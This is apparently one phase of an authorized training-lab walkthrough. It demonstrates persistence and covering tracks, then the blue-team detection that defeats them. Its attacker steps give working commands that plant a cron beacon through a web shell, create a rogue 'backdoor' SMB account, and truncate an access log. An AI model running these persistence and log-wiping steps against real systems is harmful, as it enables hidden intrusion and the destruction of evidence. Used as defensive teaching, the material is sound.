# Phase 7 — Persistence and covering tracks

> Reference scenario — authorized lab use only. See [`../DISCLAIMER.md`](../DISCLAIMER.md).

## Video concept

Persistence (kill chain step 4) and impact (step 8) — plus the video's dwell
time chapter: what the attacker does to stay and to hide, and why centralized
logs defeat the hiding.

## Objective

Plant two backdoor analogs (a cron beacon on `web01`, a rogue SMB account on
`filesrv`), then attempt to erase the local evidence — and verify that the
blue team still has everything, because the logs were copied the moment they
were written.

## Attacker steps

```bash
# 1) Persistence #1: a scheduled beacon on web01 over the allowed SMB path
#    (DMZ -> filesrv 445, FW-07). Planted through the web shell:
curl -s -b /tmp/ck.txt -X POST --data-urlencode "cmd=cat > /usr/local/bin/beacon.sh <<'EOF'
#!/bin/bash
smbclient //10.10.30.11/public -U 'svc_web%Web#Svc2026!' -c ls >/dev/null 2>&1
EOF" \
  "http://172.31.100.1/console?token=DEV-2026"

curl -s -b /tmp/ck.txt -X POST \
  --data-urlencode "cmd=chmod +x /usr/local/bin/beacon.sh && echo '*/15 * * * * /usr/local/bin/beacon.sh' | crontab - && crontab -l" \
  "http://172.31.100.1/console?token=DEV-2026"
#   expected: the crontab line echoed back - every 15 minutes, silently.

# 2) Persistence #2: a rogue account on the file server (simulated attacker
#    holding a filesrv shell - in a real intrusion this follows a service
#    compromise; here it is the backdoor analog, and the blue team watches it).
docker exec filesrv useradd --no-create-home --shell /usr/sbin/nologin backdoor
printf 'Backdoor#2026!\nBackdoor#2026!\n' | docker exec -i filesrv smbpasswd -s -a backdoor

# 3) Covering tracks: truncate the web01 application log locally.
curl -s -b /tmp/ck.txt -X POST \
  --data-urlencode "cmd=truncate -s 0 /var/log/app/access.log && ls -la /var/log/app/" \
  "http://172.31.100.1/console?token=DEV-2026"
#   expected: access.log size 0 - locally, the evidence "disappears".

# 4) Trigger the beacon once so the blue team sees it immediately:
curl -s -b /tmp/ck.txt -X POST \
  --data-urlencode "cmd=/usr/local/bin/beacon.sh; echo beacon-ran" \
  "http://172.31.100.1/console?token=DEV-2026"
```

## What the blue team sees

| Signal | Where | Sample line | Detection |
|---|---|---|---|
| The beacon sessions | filesrv audit | `Jan 15 03:15:00 filesrv smbd_audit: svc_web|10.10.10.5|public|connect|ok|public` — repeating every 15 min | machine-like periodicity = the timing IoA |
| Rogue account creation | filesrv passdb | `docker exec filesrv pdbedit -L` lists `backdoor` | account inventory review; with auditd it would be a useradd execve event (see `detections/audit-policy.md`) |
| "Deleted" evidence — still present | container stdout | `2026-01-15 03:02:41,118 INFO AUTH-BYPASS ip=172.31.100.3 ...` (phases 2-6 intact) | `docker logs web01` — the stdout copy was captured before the truncate |
| Log-delete TTP (SMB variant) | filesrv audit | `... smbd_audit: ... |unlink|ok|...log` | SIEM rule 100940 |

```bash
# Blue-team commands - the truncate did NOT win:
docker logs web01 2>&1 | grep 'AUTH-BYPASS' | head
docker exec filesrv grep 'svc_web' /var/log/samba/audit.log | awk '{print $1, $2}' | uniq -c   # beacon rhythm
docker exec filesrv pdbedit -L | grep -i backdoor
# The command that did the erasing is itself still in the stdout copy:
docker logs web01 2>&1 | grep 'truncate'
```

The lesson in one line: local log tampering only erases the *local* copy.
The stdout stream was captured by the container runtime the moment it was
written; in a blue-profile deployment the Wazuh manager holds an independent
copy too (`siem/README.md`) — this is the SIEM's core value against dwell
time, exactly as the video describes.

## IOC vs IoA box

- **IOC (artifact):** the new `backdoor` SMB account, and the cron entry
  `/usr/local/bin/beacon.sh` — discrete, enumerable changes to the hosts.
- **IoA (behavior):** the 15-minute beacon rhythm — `svc_web` SMB sessions
  from `10.10.10.5` at machine-regular intervals, including at 03:00-style
  hours when no human works.

## Kill chain position

Step 4 — persistence (cron beacon + rogue account), with the log-tampering
attempt demonstrating step 8 (impact against the defenders' evidence) and the
dwell-time chapter's central claim: centralize logs, and covering tracks
fails.
